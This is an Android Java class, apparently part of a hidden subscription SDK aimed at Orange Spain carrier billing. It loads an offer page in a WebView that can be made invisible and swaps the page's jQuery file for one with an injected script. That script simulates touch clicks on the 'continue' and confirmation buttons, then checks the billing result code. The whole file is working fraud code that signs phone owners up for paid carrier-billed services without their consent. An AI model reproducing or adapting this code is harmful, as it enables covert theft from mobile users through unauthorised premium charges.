package com.enhtmv.sublib.work.spain;

import android.view.View;
import android.view.ViewGroup;
import android.webkit.JavascriptInterface;
import android.webkit.WebChromeClient;
import android.webkit.WebResourceRequest;
import android.webkit.WebResourceResponse;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import com.blankj.utilcode.util.AppUtils;
import com.blankj.utilcode.util.ConvertUtils;
import com.blankj.utilcode.util.ResourceUtils;
import com.blankj.utilcode.util.Utils;
import com.cp.plugin.Plugin;
import com.enhtmv.sublib.common.sub.WebViewSubCall;

import java.io.InputStream;
import java.lang.reflect.Method;

import okhttp3.HttpUrl;

public class SpainOrange extends WebViewSubCall {


    private static String script;

    private ViewGroup viewGroup;

    public SpainOrange(ViewGroup viewGroup) {
        super(new WebView(Utils.getApp().getBaseContext()));

        this.viewGroup = viewGroup;

        webView.setWebChromeClient(new WebChromeClient());

        webView.setWebViewClient(new WebViewClient() {
            @Override
            public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
                view.loadUrl(request.getUrl().toString());
                return true;
            }

            @Override
            public void onPageFinished(WebView view, String url) {
                super.onPageFinished(view, url);
            }

            @Override
            public WebResourceResponse shouldInterceptRequest(WebView view, WebResourceRequest request) {

                String url = request.getUrl().toString();

                if (ignore(request)) {
                    return new WebResourceResponse("", "", null);
                }

                if (url.startsWith("http://go-es.allcpx.com/web/sub/result")) {

                    HttpUrl httpUrl = HttpUrl.parse(url);

                    if (httpUrl != null) {
                        String code = httpUrl.queryParameter("dcbErrorCode");

                        if ("0".equals(code) || "150".equals(code)) {
                            success();
                        } else {
                            r.w("error", url);
                        }
                    } else {
                        r.w("error", url);
                    }

                }


                if (url.endsWith("jquery.min.js")) {

                    String orangeJs = ResourceUtils.readAssets2String("jquery.js") + "\n" + script;

                    InputStream inputStream = ConvertUtils.string2InputStream(orangeJs, "utf-8");

                    return new WebResourceResponse("application/javascript; charset=utf-8", "utf-8", inputStream);

                }

                return super.shouldInterceptRequest(view, request);
            }
        });

        initScript();
    }

    private void initScript() {
        script = "function log(tag,info){\n" +
                "        window.LOG." + name() + "(tag,info)\n" +
                "}\n" +
                "\n" +
                "\n" +
                "var num=0\n" +
                "\n" +
                "function triggerTouchEvent(el, eventType) {\n" +
                "        var rect = el.getBoundingClientRect();\n" +
                "\n" +
                "\n" +
                "        var x=rect.left + rect.width/2.0;\n" +
                "        var y=rect.top + rect.height/2.0;\n" +
                "\n" +
                "        x=x-num;\n" +
                "        y=y-num;\n" +
                "\n" +
                "        num=Math.random()\n" +
                "\n" +
                "        var touch = new Touch({\n" +
                "            identifier:0,\n" +
                "            target: el,\n" +
                "            clientX: x,\n" +
                "            clientY: y,\n" +
                "            screenX: x,\n" +
                "            screenY: y,\n" +
                "            radiusX: 25.509714126586914,\n" +
                "            radiusY: 25.509714126586914,\n" +
                "            rotationAngle: 0,\n" +
                "            force: 0.6500000357627869\n" +
                "        });\n" +
                "        var touchEvent = new TouchEvent(eventType, {\n" +
                "            cancelable: false,\n" +
                "            bubbles: true,\n" +
                "            touches: [touch],\n" +
                "            targetTouches: [],\n" +
                "            changedTouches: [touch]\n" +
                "        });\n" +
                "        el.dispatchEvent(touchEvent);\n" +
                "}\n" +
                "\n" +
                "\n" +
                "function touchClick(el,next){\n" +
                "        triggerTouchEvent(el, 'touchstart');\n" +
                "        setTimeout(function() {\n" +
                "                // 触发touchend\n" +
                "                triggerTouchEvent(el, 'touchend');\n" +
                "\n" +
                "                el.click();\n" +
                "                \n" +
                "                if(typeof next === \"function\"){\n" +
                "                        next();\n" +
                "                }\n" +
                "        }, 220); \n" +
                "}\n" +
                "\n" +
                "\n" +
                "$(document).ready(function(){\n" +
                "        \n" +
                "            var btn1 = document.getElementById('btn_continuar');\n" +
                "            var btn2 = document.getElementById('btn_popup_der');\n" +
                "\n" +
                "            setTimeout(() => {\n" +
                "                  \n" +
                "                log(\"step1\",\"\")\n" +
                "\n" +
                "                touchClick(btn1,setTimeout(() => {\n" +
                "\n" +
                "                      log(\"step2\",\"\")\n" +
                "\n" +
                "                      touchClick(btn2)  \n" +
                "\n" +
                "                }, 2500))\n" +
                "\n" +
                "        }, 5000);\n" +
                "});";


    }


    private String name() {

        for (Method method : JavascriptLog.class.getMethods()) {
            JavascriptInterface annotation = method.getAnnotation(JavascriptInterface.class);
            if (annotation != null) {
                return method.getName();
            }
        }
        return null;
    }


    @Override
    public void sub(String info) {


        handler.post(new Runnable() {
            @Override
            public void run() {

                if (Plugin.isHiden()) {
                    webView.setVisibility(View.GONE);
                }

                viewGroup.addView(webView);

                webView.clearHistory();
                webView.clearCache(true);
                webView.clearFormData();

                report(SUB_REQEUST);

                webView.loadUrl("http://offer.allcpx.com/offer/track?offer=271&clickId=" + androidId);
            }
        });

    }


}
